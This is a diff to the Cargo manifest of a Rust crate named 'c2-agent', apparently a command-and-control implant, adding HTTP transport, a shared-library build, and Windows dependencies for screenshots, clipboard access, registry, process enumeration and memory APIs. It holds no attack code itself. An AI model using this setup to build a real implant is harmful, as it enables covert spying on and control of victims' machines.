@@ -1,33 +1,56 @@
 [package]
 name = "c2-agent"
-version = "1.0.0"
+version = "2.0.0"
 edition = "2021"
 authors = ["C2-Phantom Team"]
 
+[lib]
+name = "c2_agent"
+crate-type = ["cdylib", "rlib"]  # Both shared library and Rust library
+
 [dependencies]
 # Async runtime
-tokio = { version = "1.35", features = ["rt", "net", "time", "macros"], default-features = false }
+tokio = { version = "1.35", features = ["rt", "net", "time", "macros", "fs", "process"], default-features = false }
 
 # Crypto (pure Rust, no OpenSSL)
 chacha20poly1305 = "0.10"
 rand_core = { version = "0.6", features = ["getrandom"] }
+rand = "0.8"
 sha2 = "0.10"
 
-# HTTP client (minimal)
-tiny_http = { version = "0.12", optional = true }
+# HTTP client
+reqwest = { version = "0.11", default-features = false, features = ["rustls-tls", "json"] }
 
 # Serialization
-serde = { version = "1.0", features = ["derive"], default-features = false }
-serde_json = { version = "1.0", default-features = false, features = ["alloc"] }
+serde = { version = "1.0", features = ["derive"] }
+serde_json = "1.0"
+base64 = "0.21"
+
+# System info
+sysinfo = "0.30"
+
+# Image processing (for screenshots)
+image = { version = "0.24", optional = true }
+
+# Clipboard
+clipboard-win = { version = "4.5", optional = true }
+
+# Registry (Windows)
+winreg = { version = "0.52", optional = true }
 
 # Windows API
 [target.'cfg(windows)'.dependencies]
-windows = { version = "0.52", features = [
-    "Win32_Foundation",
-    "Win32_System_Threading",
-    "Win32_System_Memory",
-    "Win32_System_LibraryLoader",
-    "Win32_Security",
+winapi = { version = "0.3", features = [
+    "winuser",
+    "winnt",
+    "processthreadsapi",
+    "memoryapi",
+    "handleapi",
+    "libloaderapi",
+    "sysinfoapi",
+    "wingdi",
+    "tlhelp32",
+    "wincrypt",
 ] }
 
 [profile.release]
@@ -45,5 +68,6 @@ name = "c2-agent"
 path = "src/main.rs"
 
 [features]
-default = []
-http = ["tiny_http"]
+default = ["full"]
+full = ["image", "clipboard-win", "winreg"]
+minimal = []
